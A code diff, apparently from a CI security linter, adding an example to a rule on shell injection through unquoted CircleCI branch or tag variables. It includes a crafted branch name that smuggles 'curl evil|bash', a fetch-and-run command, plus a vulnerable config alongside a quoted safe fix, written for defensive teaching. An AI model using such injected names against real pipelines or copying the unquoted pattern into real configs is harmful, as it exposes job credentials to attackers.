@@ -29,6 +29,35 @@ RULE = Rule(
         "unquoted into `run:` commands allows shell injection via "
         "specially crafted branch or tag names."
     ),
+    exploit_example=(
+        "# Vulnerable: a branch named ``feat;curl evil|bash;``\n"
+        "# lands in the shell verbatim via ``$CIRCLE_BRANCH``. The\n"
+        "# injected ``curl`` runs in the step's shell with the\n"
+        "# job's full credential set in scope.\n"
+        "version: 2.1\n"
+        "jobs:\n"
+        "  build:\n"
+        "    docker:\n"
+        "      - image: alpine@sha256:abc123...\n"
+        "    steps:\n"
+        "      - run: |\n"
+        "          echo \"Building $CIRCLE_BRANCH\"\n"
+        "          ./build.sh --branch $CIRCLE_BRANCH\n"
+        "\n"
+        "# Safe: assign the untrusted value to a local shell\n"
+        "# variable and quote on every use. Injected\n"
+        "# metacharacters stay literal.\n"
+        "version: 2.1\n"
+        "jobs:\n"
+        "  build:\n"
+        "    docker:\n"
+        "      - image: alpine@sha256:abc123...\n"
+        "    steps:\n"
+        "      - run: |\n"
+        "          branch=\"$CIRCLE_BRANCH\"\n"
+        "          echo \"Building $branch\"\n"
+        "          ./build.sh --branch \"$branch\""
+    ),
 )
 
 
